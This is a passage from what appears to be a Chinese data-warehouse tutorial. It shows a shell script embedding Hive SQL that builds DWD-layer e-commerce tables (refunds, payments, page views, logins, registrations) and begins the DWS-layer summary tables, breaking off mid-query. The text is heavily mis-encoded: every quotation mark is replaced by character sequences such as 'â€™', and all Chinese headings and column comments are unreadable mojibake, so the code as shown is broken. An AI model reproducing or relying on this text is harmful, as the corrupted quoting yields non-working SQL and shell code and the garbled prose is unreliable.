${APP}.ods_order_detail_coupon_inc</p><p>where dt = â€˜$do_dateâ€™</p><p>and type = â€˜insertâ€™</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p>â€œ</p><p>dwd_trade_order_refund_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_order_refund_inc<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>ri.id,</p><p>user_id,</p><p>order_id,</p><p>sku_id,</p><p>province_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>refund_type,</p><p>type_dic.dic_name,</p><p>refund_reason_type,</p><p>reason_dic.dic_name,</p><p>refund_reason_txt,</p><p>refund_num,</p><p>refund_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_type,</p><p>data.refund_num,</p><p>data.refund_amount,</p><p>data.refund_reason_type,</p><p>data.refund_reason_txt,</p><p>data.create_time</p><p>from ${APP}.ods_order_refund_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™insertâ€™</p><p>)ri</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™updateâ€™</p><p>and data.order_status=â€™1005â€™</p><p>and array_contains(map_keys(old),â€™order_statusâ€™)</p><p>)oi</p><p>on ri.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code = â€˜15â€™</p><p>)type_dic</p><p>on ri.refund_type=type_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code = â€˜13â€™</p><p>)reason_dic</p><p>on ri.refund_reason_type=reason_dic.dic_code;</p><p>â€œ</p><p>dwd_trade_pay_detail_suc_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_pay_detail_suc_inc partition<br>(dt=â€™$do_dateâ€™)</p><p>select</p><p>od.id,</p><p>od.order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>payment_type,</p><p>pay_dic.dic_name,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>callback_time,</p><p>source_id,</p><p>source_type,</p><p>src_dic.dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ${APP}.ods_order_detail_inc</p><p>where (dt = â€˜$do_dateâ€™ or dt = date_add(â€˜$do_dateâ€™,-1))</p><p>and (type = â€˜insertâ€™ or type = â€˜bootstrap-insertâ€™)</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.user_id,</p><p>data.order_id,</p><p>data.payment_type,</p><p>data.callback_time</p><p>from ${APP}.ods_payment_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™updateâ€™</p><p>and array_contains(map_keys(old),â€™payment_statusâ€™)</p><p>and data.payment_status=â€™1602â€™</p><p>) pi</p><p>on od.order_id=pi.order_id</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where (dt = â€˜$do_dateâ€™ or dt = date_add(â€˜$do_dateâ€™,-1))</p><p>and (type = â€˜insertâ€™ or type = â€˜bootstrap-insertâ€™)</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ${APP}.ods_order_detail_activity_inc</p><p>where (dt = â€˜$do_dateâ€™ or dt = date_add(â€˜$do_dateâ€™,-1))</p><p>and (type = â€˜insertâ€™ or type = â€˜bootstrap-insertâ€™)</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ${APP}.ods_order_detail_coupon_inc</p><p>where (dt = â€˜$do_dateâ€™ or dt = date_add(â€˜$do_dateâ€™,-1))</p><p>and (type = â€˜insertâ€™ or type = â€˜bootstrap-insertâ€™)</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™11â€™</p><p>) pay_dic</p><p>on pi.payment_type=pay_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™24â€™</p><p>)src_dic</p><p>on od.source_type=src_dic.dic_code;</p><p>â€œ</p><p>dwd_trade_refund_pay_suc_inc=â€</p><p>insert overwrite table ${APP}.dwd_trade_refund_pay_suc_inc<br>partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>rp.id,</p><p>user_id,</p><p>rp.order_id,</p><p>rp.sku_id,</p><p>province_id,</p><p>payment_type,</p><p>dic_name,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>callback_time,</p><p>refund_num,</p><p>total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.payment_type,</p><p>data.callback_time,</p><p>data.total_amount</p><p>from ${APP}.ods_refund_payment_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type = â€˜updateâ€™</p><p>and array_contains(map_keys(old),â€™refund_statusâ€™)</p><p>and data.refund_status=â€™1602â€™</p><p>)rp</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ${APP}.ods_order_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™updateâ€™</p><p>and data.order_status=â€™1006â€™</p><p>and array_contains(map_keys(old),â€™order_statusâ€™)</p><p>)oi</p><p>on rp.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_num</p><p>from ${APP}.ods_order_refund_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™updateâ€™</p><p>and data.refund_status=â€™0705â€™</p><p>and array_contains(map_keys(old),â€™refund_statusâ€™)</p><p>)ri</p><p>on rp.order_id=ri.order_id</p><p>and rp.sku_id=ri.sku_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=â€™$do_dateâ€™</p><p>and parent_code=â€™11â€™</p><p>)dic</p><p>on rp.payment_type=dic.dic_code;</p><p>â€œ</p><p>dwd_traffic_action_inc=â€</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_action_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>action_id,</p><p>action_item,</p><p>action_item_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) action_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>action.action_id,</p><p>action.item action_item,</p><p>action.item_type action_item_type,</p><p>action.ts</p><p>from ${APP}.ods_log_inc lateral view explode(actions) tmp as action</p><p>where dt=â€™$do_dateâ€™</p><p>and actions is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_traffic_display_inc=â€</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_display_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>during_time,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) display_time,</p><p>display_type,</p><p>display_item,</p><p>display_item_type,</p><p>display_order,</p><p>display_pos_id</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>display.display_type,</p><p>display.item display_item,</p><p>display.item_type display_item_type,</p><p>display.\`order\` display_order,</p><p>display.pos_id display_pos_id,</p><p>ts</p><p>from ${APP}.ods_log_inc lateral view explode(displays) tmp as display</p><p>where dt=â€™$do_dateâ€™</p><p>and displays is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_traffic_error_inc=â€</p><p>set hive.cbo.enable=false;</p><p>set hive.execution.engine=mr;</p><p>insert overwrite table ${APP}.dwd_traffic_error_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>entry,</p><p>loading_time,</p><p>open_ad_id,</p><p>open_ad_ms,</p><p>open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) error_time,</p><p>error_code,</p><p>error_msg</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>\`start\`.entry,</p><p>\`start\`.loading_time,</p><p>\`start\`.open_ad_id,</p><p>\`start\`.open_ad_ms,</p><p>\`start\`.open_ad_skip_ms,</p><p>actions,</p><p>displays,</p><p>err.error_code,</p><p>err.msg error_msg,</p><p>ts</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and err is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>set hive.execution.engine=spark;</p><p>â€œ</p><p>dwd_traffic_page_view_inc=â€</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_page_view_inc partition<br>(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>page_item,</p><p>page_item_type,</p><p>last_page_id,</p><p>page_id,</p><p>source_type,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) view_time,</p><p>concat(mid_id,â€™-â€˜,last_value(session_start_point,true) over (partition by mid_id<br>order by ts)) session_id,</p><p>during_time</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>page.during_time,</p><p>page.item page_item,</p><p>page.item_type page_item_type,</p><p>page.last_page_id,</p><p>page.page_id,</p><p>page.source_type,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and page is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_traffic_start_inc=â€</p><p>set hive.cbo.enable=false;</p><p>insert overwrite table ${APP}.dwd_traffic_start_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>province_id,</p><p>brand,</p><p>channel,</p><p>is_new,</p><p>model,</p><p>mid_id,</p><p>operate_system,</p><p>user_id,</p><p>version_code,</p><p>entry,</p><p>open_ad_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) action_time,</p><p>loading_time,</p><p>open_ad_ms,</p><p>open_ad_skip_ms</p><p>from</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.is_new,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code,</p><p>\`start\`.entry,</p><p>\`start\`.loading_time,</p><p>\`start\`.open_ad_id,</p><p>\`start\`.open_ad_ms,</p><p>\`start\`.open_ad_skip_ms,</p><p>ts</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and \`start\` is not null</p><p>)log</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_user_login_inc=â€</p><p>insert overwrite table ${APP}.dwd_user_login_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>user_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-ddâ€™) date_id,</p><p>date_format(from_utc_timestamp(ts,â€™GMT+8â€™),â€™yyyy-MM-dd HH:mm:ssâ€™) login_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>row_number() over (partition by session_id order by ts) rn</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>channel,</p><p>area_code,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system,</p><p>ts,</p><p>concat(mid_id,â€™-â€˜,last_value(session_start_point,true) over(partition by mid_id<br>order by ts)) session_id</p><p>from</p><p>(</p><p>select</p><p>common.uid user_id,</p><p>common.ch channel,</p><p>common.ar area_code,</p><p>common.vc version_code,</p><p>common.mid mid_id,</p><p>common.ba brand,</p><p>common.md model,</p><p>common.os operate_system,</p><p>ts,</p><p>if(page.last_page_id is null,ts,null) session_start_point</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and page is not null</p><p>)t1</p><p>)t2</p><p>where user_id is not null</p><p>)t3</p><p>where rn=1</p><p>)t4</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on t4.area_code=bp.area_code;</p><p>â€œ</p><p>dwd_user_register_inc=â€</p><p>insert overwrite table ${APP}.dwd_user_register_inc partition(dt=â€™$do_dateâ€™)</p><p>select</p><p>ui.user_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>channel,</p><p>province_id,</p><p>version_code,</p><p>mid_id,</p><p>brand,</p><p>model,</p><p>operate_system</p><p>from</p><p>(</p><p>select</p><p>data.id user_id,</p><p>data.create_time</p><p>from ${APP}.ods_user_info_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and type=â€™insertâ€™</p><p>)ui</p><p>left join</p><p>(</p><p>select</p><p>common.ar area_code,</p><p>common.ba brand,</p><p>common.ch channel,</p><p>common.md model,</p><p>common.mid mid_id,</p><p>common.os operate_system,</p><p>common.uid user_id,</p><p>common.vc version_code</p><p>from ${APP}.ods_log_inc</p><p>where dt=â€™$do_dateâ€™</p><p>and page.page_id=â€™registerâ€™</p><p>and common.uid is not null</p><p>)log</p><p>on ui.user_id=log.user_id</p><p>left join</p><p>(</p><p>select</p><p>id province_id,</p><p>area_code</p><p>from ${APP}.ods_base_province_full</p><p>where dt=â€™$do_dateâ€™</p><p>)bp</p><p>on log.area_code=bp.area_code;</p><p>â€œ</p><p>case $1 in</p><p>â€œdwd_interaction_comment_incâ€ )</p><p>hive -e â€œ$dwd_interaction_comment_incâ€</p><p>;;</p><p>â€œdwd_interaction_favor_add_incâ€ )</p><p>hive -e â€œ$dwd_interaction_favor_add_incâ€</p><p>;;</p><p>â€œdwd_tool_coupon_get_incâ€ )</p><p>hive -e â€œ$dwd_tool_coupon_get_incâ€</p><p>;;</p><p>â€œdwd_tool_coupon_order_incâ€ )</p><p>hive -e â€œ$dwd_tool_coupon_order_incâ€</p><p>;;</p><p>â€œdwd_tool_coupon_pay_incâ€ )</p><p>hive -e â€œ$dwd_tool_coupon_pay_incâ€</p><p>;;</p><p>â€œdwd_trade_cancel_detail_incâ€ )</p><p>hive -e â€œ$dwd_trade_cancel_detail_incâ€</p><p>;;</p><p>â€œdwd_trade_cart_add_incâ€ )</p><p>hive -e â€œ$dwd_trade_cart_add_incâ€</p><p>;;</p><p>â€œdwd_trade_cart_fullâ€ )</p><p>hive -e â€œ$dwd_trade_cart_fullâ€</p><p>;;</p><p>â€œdwd_trade_order_detail_incâ€ )</p><p>hive -e â€œ$dwd_trade_order_detail_incâ€</p><p>;;</p><p>â€œdwd_trade_order_refund_incâ€ )</p><p>hive -e â€œ$dwd_trade_order_refund_incâ€</p><p>;;</p><p>â€œdwd_trade_pay_detail_suc_incâ€ )</p><p>hive -e â€œ$dwd_trade_pay_detail_suc_incâ€</p><p>;;</p><p>â€œdwd_trade_refund_pay_suc_incâ€ )</p><p>hive -e â€œ$dwd_trade_refund_pay_suc_incâ€</p><p>;;</p><p>â€œdwd_traffic_action_incâ€ )</p><p>hive -e â€œ$dwd_traffic_action_incâ€</p><p>;;</p><p>â€œdwd_traffic_display_incâ€ )</p><p>hive -e â€œ$dwd_traffic_display_incâ€</p><p>;;</p><p>â€œdwd_traffic_error_incâ€ )</p><p>hive -e â€œ$dwd_traffic_error_incâ€</p><p>;;</p><p>â€œdwd_traffic_page_view_incâ€ )</p><p>hive -e â€œ$dwd_traffic_page_view_incâ€</p><p>;;</p><p>â€œdwd_traffic_start_incâ€ )</p><p>hive -e â€œ$dwd_traffic_start_incâ€</p><p>;;</p><p>â€œdwd_user_login_incâ€ )</p><p>hive -e â€œ$dwd_user_login_incâ€</p><p>;;</p><p>â€œdwd_user_register_incâ€ )</p><p>hive -e â€œ$dwd_user_register_incâ€</p><p>;;</p><p>â€œallâ€ )</p><p>hive -e<br>â€œ$dwd_interaction_comment_inc$dwd_interaction_favor_add_inc$dwd_tool_coupon_get_inc$dwd_tool_coupon_order_inc$dwd_tool_coupon_pay_inc$dwd_trade_cancel_detail_inc$dwd_trade_cart_add_inc$dwd_trade_cart_full$dwd_trade_order_detail_inc$dwd_trade_order_refund_inc$dwd_trade_pay_detail_suc_inc$dwd_trade_refund_pay_suc_inc$dwd_traffic_action_inc$dwd_traffic_display_inc$dwd_traffic_error_inc$dwd_traffic_page_view_inc$dwd_traffic_start_inc$dwd_user_login_inc$dwd_user_register_incâ€</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x ods_to_dwd.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ ods_to_dwd.sh all 2020-06-14</p><h2 id="ç¬¬10ç« -æ•°ä»“å¼€å‘ä¹‹DWSå±‚"><a href="#ç¬¬10ç« -æ•°ä»“å¼€å‘ä¹‹DWSå±‚" class="headerlink" title="ç¬¬10ç«  æ•°ä»“å¼€å‘ä¹‹DWSå±‚"></a>ç¬¬10ç«  æ•°ä»“å¼€å‘ä¹‹DWSå±‚</h2><p>è®¾è®¡è¦ç‚¹ï¼š</p><p>1ï¼‰DWSå±‚çš„è®¾è®¡å‚è€ƒæŒ‡æ ‡ä½“ç³»ã€‚</p><p>2ï¼‰DWSå±‚çš„æ•°æ®å­˜å‚¨æ ¼å¼ä¸ºorcåˆ—å¼å­˜å‚¨+snappyå‹ç¼©ã€‚</p><p>3ï¼‰DWSå±‚è¡¨åçš„å‘½åè§„èŒƒä¸ºdws_æ•°æ®åŸŸ_ç»Ÿè®¡ç²’åº¦_ä¸šåŠ¡è¿‡ç¨‹_ç»Ÿè®¡å‘¨æœŸï¼ˆ1d/nd/tdï¼‰</p><p>æ³¨ï¼š1dè¡¨ç¤ºæœ€è¿‘1æ—¥ï¼Œndè¡¨ç¤ºæœ€è¿‘næ—¥ï¼Œtdè¡¨ç¤ºå†å²è‡³ä»Šã€‚</p><h3 id="æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#æœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>æœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h3><h4 id="äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"><a href="#äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨" class="headerlink" title="äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨"></a>äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»è¡¨</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dws_trade_user_sku_order_1d;</p><p>CREATE EXTERNAL TABLE dws_trade_user_sku_order_1d</p><p>(</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜sku_idâ€™,</p><p>`sku_name` STRING COMMENT â€˜skuåç§°â€™,</p><p>`category1_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category1_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category2_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category3_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category3_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰Œidâ€™,</p><p>`tm_name` STRING COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`order_count_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•æ¬¡æ•°â€™,</p><p>`order_num_1d` BIGINT COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•ä»¶æ•°â€™,</p><p>`order_original_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•åŸå§‹é‡‘é¢â€™,</p><p>`activity_reduce_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥æ´»åŠ¨ä¼˜æƒ é‡‘é¢â€™,</p><p>`coupon_reduce_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¼˜æƒ åˆ¸ä¼˜æƒ é‡‘é¢â€™,</p><p>`order_total_amount_1d` DECIMAL(16, 2) COMMENT â€˜æœ€è¿‘1æ—¥ä¸‹å•æœ€ç»ˆé‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸç”¨æˆ·å•†å“ç²’åº¦è®¢å•æœ€è¿‘1æ—¥æ±‡æ€»äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dws/dws_trade_user_sku_order_1dâ€™</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dws_trade_user_sku_order_1d partition(dt)</p><p>select</p><p>user_id,</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_count_1d,</p><p>order_num_1d,</p><p>order_original_amount_1d,</p><p>activity_reduce_amount_1d,</p><p>coupon_reduce_amount_1d,</p><p>order_total_amount_1d,</p><p>dt</p><p>from</p><p>(</p><p>select</p><p>dt,</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_count_1d,</p><p>sum(sku_num) order_num_1d,</p><p>sum(split_original_amount) order_original_amount_1d,</p><p>sum(nvl(split_activity_amount,0.0)) activity_reduce_amount_1d,</p><p>sum(nvl(split_coupon_amount,0.0)) coupon_reduce_amount_1d,</p><p>sum(split_total_amount) order_total_amount_1d</p><p>from dwd_trade_order_detail_inc</p><p>group by dt,user_id,sku_id</p><p>)od</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name</p><p>from dim_sku_full</p><p>where dt=â€™2020-06-14â€™</p><p>)sku</p><p>on od.sku_id=sku.id;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dws_trade_user_sku_order_1d partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>user_id,</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>tm_id,</p><p>tm_name,</p><p>order_count,</p><p>order_num,</p><p>order_original_amount,</p><p>activity_reduce_amount,</p><p>coupon_reduce_amount,</p><p>order_total_amount</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>sku_id,</p><p>count(*) order_count,</p><p>sum(sku_num) order_num,</p><p>sum(split_original_amount) order_original_amount,</p><p>sum(nvl(split_activity_amount,0)) activity_reduce_amount,</p><p>sum(nvl(split_coupon_amount,0)) coupon_reduce_amount,</p><p>sum(split_total_amount) order_total_amount</p><p>from dwd_trade_order_detail_inc</p><p>where dt=â€™2020-06-15â€™</p><p>group by user_id,sku_id</p><p>)od</p><p>left 